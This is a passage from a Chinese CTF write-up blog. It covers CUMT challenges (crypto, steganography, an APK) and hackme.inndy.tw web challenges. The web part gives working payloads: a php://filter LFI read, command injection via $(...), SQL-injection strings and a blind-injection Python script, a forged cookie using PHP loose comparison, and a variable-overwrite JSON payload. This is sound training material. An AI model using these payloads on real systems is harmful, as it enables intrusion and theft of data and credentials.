class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted, passphrase)</span>:</span></span><br><span class="line">  IV = encrypted[:<span class="number">16</span>]</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  <span class="keyword">return</span> aes.decrypt(encrypted[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, passphrase)</span>:</span></span><br><span class="line">  IV = message[:<span class="number">16</span>]</span><br><span class="line">  length = <span class="number">16</span></span><br><span class="line">  count = len(message)</span><br><span class="line">  padding = length - (count % length)</span><br><span class="line">  message = message + <span class="string">"\0"</span> * padding</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  <span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line">IV = <span class="string">'YUFHJKVWEASDGQDH'</span></span><br><span class="line">a = <span class="string">"mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA=="</span></span><br><span class="line">b = base64.b64decode(a)</span><br><span class="line"><span class="keyword">print</span> decrypt(b,<span class="string">"Qq4wdrhhyEWe4qBF"</span>)</span><br></pre></td></tr></table></figure><h2 id="萌萌哒"><a href="#萌萌哒" class="headerlink" title="萌萌哒"></a>萌萌哒</h2><p>颜文字密码(aaencode)，在线解码一下</p><blockquote><p>alert(“3Nc0d3.txt”)</p></blockquote><p>访问一下这个txt文件，发现是brainfuck编码，之后再OOK!解码一下可以得到flag</p><!-- flag{My_Br@iN_is_B00m_@_@} --><h2 id="魂斗罗"><a href="#魂斗罗" class="headerlink" title="魂斗罗"></a>魂斗罗</h2><p>下载下来是个nes文件，要用fc模拟器打开，是个魂斗罗游戏，通关就可以得到flag，下载一个virtualnes软件即可运行，再用金手指输入一些秘籍来帮助我们通关，我只用了一个无限命的秘籍，其实用金身比较好，秘籍代码如下</p><p><img src="/2018/12/07/cumtctf/30.png" alt=""></p><p>然后开启1p模式通过即可，一共好像是8关</p><p><img src="/2018/12/07/cumtctf/31.png" alt=""></p><p>注意flag里面的字符是5不是s！</p><!-- hctf{ju5tf0rfun} --><h2 id="传感器2"><a href="#传感器2" class="headerlink" title="传感器2"></a>传感器2</h2><p>前面一道题目的加强版， 按照之前题目的步骤求一下ID值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">45psi: fffffed31f635055f8</span><br><span class="line">30psi: fffffed31f425055d7</span><br></pre></td></tr></table></figure><p>可以看出有两处不同，分别是63==42，f8==d7，看了大佬的wp后得到前面的两位是与psi有关，最后两位是校验值，校验值是从ID开始的每两位相加的和模256，例如对于第一个 fe+d3+1f+63+50+55=2f8=&gt;2f8%256=f8(注意是十六进制数)。前面的与psi对应的值可以按照比例计算即psi值为30时计算方式为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># py3</span></span><br><span class="line">a = (int(<span class="string">'63'</span>,<span class="number">16</span>)-int(<span class="string">'42'</span>,<span class="number">16</span>))/<span class="number">15</span> * <span class="number">5</span></span><br><span class="line">b = int(<span class="string">'42'</span>,<span class="number">16</span>) - int(a)</span><br><span class="line">print(hex(b))</span><br><span class="line"><span class="comment"># @ans=0x37</span></span><br></pre></td></tr></table></figure><p>补上ID之后求校验码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">"feb757375055"</span></span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)//<span class="number">2</span>):</span><br><span class="line">    sum += int(a[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">print(hex(sum%<span class="number">256</span>))</span><br><span class="line"><span class="comment"># @ans=0xe8</span></span><br></pre></td></tr></table></figure><p>那么最终的明文为 <code>FFFFFEB757375055E8</code></p><!-- flag{FFFFFEB757375055E8} --><h2 id="猜猜看"><a href="#猜猜看" class="headerlink" title="猜猜看"></a>猜猜看</h2><p>题目说了是一个j开头的隐写工具，Google发现了下是jphs，下载了这个软件，可以在dos下运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpseek.exe guess_flag.jpg flag.txt</span><br></pre></td></tr></table></figure><p>提取需要密码，猜测了几次发现密码为flag，在flag.txt文件中发下了二进制文本，转为16进制看一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">""</span> <span class="comment"># 此处应为flag.txt中的二进制串</span></span><br><span class="line">hex_s = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">8</span>):</span><br><span class="line">    hex_s += hex(int(s[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">print(hex_s)</span><br></pre></td></tr></table></figure><p>在线解码为字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARgAAAEYCAIAAAAI7H7bAAAFR0lEQVR4nO3dQY5bNxBAQU+Q+1/ZOUGIgHlqN2eqtoYljfQfuGiQ/Pr9+/cv4P/5609/APgOhAQBIUFASBAQEgSEBAEhQUBIEPj78G9fX19jnyOXD5onv43Dh7/7GPkLLnmvSecnyooEASFBQEgQEBIEhAQBIUFASBAQEgROA9mDJftq8wHf09PJux/l7hPmD8DrT5QVCQJCgoCQICAkCAgJAkKCgJAgICQIXA5kD5bMGQ/u5oyT08mD/YPL/XuTP/EdWpEgICQICAkCQoKAkCAgJAgICQJCgkA/kH1aPqs9WDK4XDLhfZ0VCQJCgoCQICAkCAgJAkKCgJAgICQI/MSB7ORxu3dD0qdPTv6ZrEgQEBIEhAQBIUFASBAQEgSEBAEhQaAfyH7XHZf5Ib2Tu3EP9v9e+z/hLysSJIQEASFBQEgQEBIEhAQBIUFASBC4HMg+va1y/22wk7PaJTfqPv1E/bIiQUJIEBASBIQEASFBQEgQEBIEhASBrye2H26wZAS5f9z5M58oKxIEhAQBIUFASBAQEgSEBAEhQUBIEBgdyOYjyMkXnNwuerDkvQ6efqKuWZEgICQICAkCQoKAkCAgJAgICQJCgsDokcWTd63evWBuyfHIB0tmmkuG9desSBAQEgSEBAEhQUBIEBASBIQEASFB4HIgu8TTF4/ezWon9wvn8g3Iex4AKxIEhAQBIUFASBAQEgSEBAEhQUBIEDgdWbzkQOA7k/tql2wX3e/pw6LPrEgQEBIEhAQBIUFASBAQEgSEBAEhQeC0Q3Zy0+LkPO7p85aXDH/3HxZ95/r3siJBQEgQEBIEhAQBIUFASBAQEgSEBIHLI4uX3N25ZFZ78PT8dMmv/MQlwlYkCAgJAkKCgJAgICQICAkCQoKAkCDwbe+QnRwm7t/4eWfJtmVHFsNPISQICAkCQoKAkCAgJAgICQJCgsDlHbJLdiYOD9022H+x73c9A9mRxfBxQoKAkCAgJAgICQJCgoCQICAkCPR3yN6ZvKF1cgS55Duc3BQ8OSXfM8a1IkFASBAQEgSEBAEhQUBIEBASBIQEgdNAdslJvN916prPT/P3WnJR7MGe04ytSBAQEgSEBAEhQUBIEBASBIQEASFBoL9DNp92LRm63b1gPnV9+pTm/SPj6yfKigQBIUFASBAQEgSEBAEhQUBIEBASBC7vkD1YMj+9s+Qo5oMlxyNPWnIusYEsfJyQICAkCAgJAkKCgJAgICQICAkC/Q7ZgyWTtUmTM+inL6U9eOLvsiJBQEgQEBIEhAQBIUFASBAQEgSEBIHTQHbJrtX9m0yXDC73f4w7kwcdX394KxIEhAQBIUFASBAQEgSEBAEhQUBIEDgNZJ/emjq5G3dywjtpzw2tFy84zIoEASFBQEgQEBIEhAQBIUFASBAQEgQujyx+emI4uZN0cl/t03t4J9/rE3+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPR3yE7e+HlnydbUJbPa3J5dq//mE7+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPQD2adNDkmX7DI+mPyTl5xm7A5Z+JOEBAEhQUBIEBASBIQEASFBQEgQ+IkD2SWT0HwEObmVeNKS7b3nr9eKBAEhQUBIEBASBIQEASFBQEgQEBIE+oHsknHnnckh6eG9Jg9VXvJeB/kO2U9cL2tFgoCQICAkCAgJAkKCgJAgICQICAkCX58YTm3w9G2wk/8r9/TI+JoVCQJCgoCQICAkCAgJAkKCgJAgICQInAaywH9kRYKAkCAgJAgICQJCgoCQICAkCAgJAkKCwD96oQOE684L1QAAAABJRU5ErkJggg==&quot;&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure><p>一看就是个base64编码的图片，解码一下是个二维码，扫码即可得到flag</p><p><img src="/2018/12/07/cumtctf/33.png" alt="answer"></p><p>这题还发现个stegdetect工具，收获挺大。</p><!-- flag{owid0-o91hf-9iahg} --><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="Gift"><a href="#Gift" class="headerlink" title="Gift"></a>Gift</h2><p>题目要让使用jeb，但是没找到工具，所以使用了kali下面的apktools，直接运行命令进行反编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d Gift.apk</span><br></pre></td></tr></table></figure><p>在Gift/smali/com/example/gift/flag.smail文件夹下面即可看到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CUMT网络安全实训平台题目记录&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>hackme-web题解</title>
    <link href="http://chaosec.top/2018/08/28/hackme/"/>
    <id>http://chaosec.top/2018/08/28/hackme/</id>
    <published>2018-08-28T15:06:49.673Z</published>
    <updated>2019-01-30T11:49:49.997Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址<a href="https://hackme.inndy.tw/" target="_blank" rel="noopener">https://hackme.inndy.tw/</a></p><a id="more"></a><h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>查看源代码</p><p><img src="/2018/08/28/hackme/1.png" alt=""></p><p>尝试读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</span><br></pre></td></tr></table></figure><blockquote><p>Can you read the flag&lt;?php require(‘config.php’); ?&gt;?</p></blockquote><p>读取config即可得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config</span><br></pre></td></tr></table></figure><h1 id="homepage"><a href="#homepage" class="headerlink" title="homepage"></a>homepage</h1><p>查看代码在结尾看到一个<code>cute.js</code>，跟踪一下，发现aaencode编码，丢在控制台执行即可得到二维码，扫描即可</p><h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>命令执行，我们可以使用 <code>$()</code> 或者 <code><code> </code></code> 都可以实现执行命令的作用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/ping/?ip=$(ls -a)</span><br></pre></td></tr></table></figure><p>然后访问flag.php文件，因为题目过滤flag和php关键字，还有cat等命令，我们可以尝试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/ping/?ip=$(tac *.*)</span><br></pre></td></tr></table></figure><h1 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a>scoreboard</h1><p>f12查看点击网络，查看一下消息头即可看到flag</p><h1 id="login-as-admin-0"><a href="#login-as-admin-0" class="headerlink" title="login as admin 0"></a>login as admin 0</h1><p>题目主要源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="comment">// table schema</span></span><br><span class="line"><span class="comment">// user -&gt; id, user, password, is_admin</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'show_source'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">// connect to database</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $connection_string = sprintf(<span class="string">'mysql:host=%s;dbname=%s;charset=utf8mb4'</span>, DB_HOST, DB_NAME);</span><br><span class="line">    $db = <span class="keyword">new</span> PDO($connection_string, DB_USER, DB_PASS);</span><br><span class="line">    $sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $query = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($query) &#123;</span><br><span class="line">            $user = $query-&gt;fetchObject();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $user = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本题是一道sql注入题目，要求我们以admin身份登录，题目过滤部分如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line">$_</span><br></pre></td></tr></table></figure><p>可以看到，题目过滤了 <code>or 1=1</code> 等字符，还会用反斜杠转义单引号，漏洞点就在于本题只转义引号，不转义其它字符，所以我们可以考虑用自己提交的反斜杠转义掉引号前面的反斜杠，这样引号就被脱出来了，于是我们可以成功闭合，另外由于题目转义了引号，我们在构造admin登录的时候，可以使用16进制绕过，最终payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=guest\&apos; or user=0x61646d696e-- +&amp;password=guest</span><br></pre></td></tr></table></figure><h1 id="login-as-admin-0-1"><a href="#login-as-admin-0-1" class="headerlink" title="login as admin 0.1"></a>login as admin 0.1</h1><p>上个题目的加强版，直接union注入即可，最终payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=guest\&apos;  union select 1,the_f14g,3,3 from h1dden_f14g-- +&amp;password=123465</span><br></pre></td></tr></table></figure><h1 id="login-as-admin-1"><a href="#login-as-admin-1" class="headerlink" title="login as admin 1"></a>login as admin 1</h1><p>题目过滤并不严格，payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\&apos;/**/or/**/1/**/limit/**/0,1#</span><br></pre></td></tr></table></figure><h1 id="login-as-admin-1-2"><a href="#login-as-admin-1-2" class="headerlink" title="login as admin 1.2"></a>login as admin 1.2</h1><p>上一题的加强版，需要进行盲注，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://hackme.inndy.tw/login1/index.php"</span></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload1 = r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line"><span class="comment"># database:login_as_admin1</span></span><br><span class="line"><span class="comment"># payload1 = r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line"><span class="comment"># tables: 0bdb54c98123f5526ccaed982d2006a9,users</span></span><br><span class="line"><span class="comment"># payload1 = r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line"><span class="comment"># id,4a391a11cfa831ca740cf8d00782f3a6</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(4a391a11cfa831ca740cf8d00782f3a6)/**/from/**/0bdb54c98123f5526ccaed982d2006a9),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line">data = &#123;<span class="string">'name'</span>:<span class="string">r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)#"</span>, <span class="string">'password'</span>:<span class="string">"123"</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">70</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">data[<span class="string">'name'</span>] = payload1.format(str(length),str(j))</span><br><span class="line">content = requests.post(url,data=data).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">"FLAG"</span> <span class="keyword">in</span> content:</span><br><span class="line">flag += chr(j)</span><br><span class="line">print(<span class="string">'**flag:**'</span>,flag)</span><br><span class="line">length += <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="login-as-admin-3"><a href="#login-as-admin-3" class="headerlink" title="login as admin 3"></a>login as admin 3</h1><p>题目要求我们以admin身份登录，漏洞点在于验证登录时的判断使用了 <code>!=</code> ，这就存在弱比较的漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $secret, $error;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $unserialized = json_decode(base64_decode($_COOKIE[<span class="string">'user'</span>]), <span class="keyword">true</span>);</span><br><span class="line">    $r = hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>];</span><br><span class="line">    <span class="keyword">if</span>(hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>]) &#123;</span><br><span class="line">        $error = <span class="string">'Invalid session'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = json_decode($unserialized[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'name'</span> =&gt; $data[<span class="number">0</span>],</span><br><span class="line">        <span class="string">'admin'</span> =&gt; $data[<span class="number">1</span>]</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们只要使$unserialized[‘sig’]的值为数字0即可绕过验证</p><p>那么我们构造一个cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $user, $secret;</span><br><span class="line">    $user = [<span class="string">'admin'</span>, <span class="keyword">true</span>];</span><br><span class="line">    $data = json_encode($user);</span><br><span class="line">    $sig = <span class="number">0</span>;</span><br><span class="line">    $all = base64_encode(json_encode([<span class="string">'sig'</span> =&gt; $sig, <span class="string">'data'</span> =&gt; $data]));</span><br><span class="line">    <span class="keyword">return</span> $all;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> set_user();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后刷新即可</p><h1 id="login-as-admin-4"><a href="#login-as-admin-4" class="headerlink" title="login as admin 4"></a>login as admin 4</h1><p>题目存在逻辑漏洞，重定向之后并没有exit，所以导致最终的判断被执行，所以我们只需要提交name为admin即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d <span class="string">"name=admin"</span> https://hackme.inndy.tw/login4/</span><br></pre></td></tr></table></figure><h1 id="Login-as-Admin-6"><a href="#Login-as-Admin-6" class="headerlink" title="Login as Admin 6"></a>Login as Admin 6</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data = json_decode($_POST[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">    &#125;</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="keyword">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">        $user = $username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看代码可知存在变量覆盖漏洞，构造json数据即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;<span class="string">"users"</span>:&#123;<span class="string">"admin"</span>:<span class="string">"snow"</span>&#125;,<span class="string">"username"</span>:<span class="string">"admin"</span>,<span class="string">"password"</span>:<span class="string">"snow"</span>&#125;</span><br></pre></td></tr></table></figure><h1 id="login-as-admin-7"><a href="#login-as-admin-7" class="headerlink" title="login as admin 7"></a>login as admin 7</h1><p>md5弱比较</p><p><img src="/2018/08/28/hackme/2.png" alt="payload"></p><h1 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a>dafuq-manager 1</h1><p>查看cookie可以发现 <strong><em>show_hidden</em></strong> 字段为 <strong><em>no</em></strong>，改为<strong><em>yes</em></strong>刷新即可得到flag</p><h1 id="dafuq-manager-2"><a href="#dafuq-manager-2" class="headerlink" title="dafuq-manager 2"></a>dafuq-manager 2</h1><p>这是一道代码审计，这是我第一次做这种整个网站源码的审计，还是有点被惊到了，万事开头难，看了别人的思路，我也开始了自己的审计之路，题目要求我们以admin的身份登录查看flag</p><p>推荐使用PHPstorm来审计这种代码，搜索定位函数和变量会方便一点，先查看入口文件index.php，找到了admin相关的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"admin"</span>:</span><br><span class="line">        <span class="keyword">require</span> <span 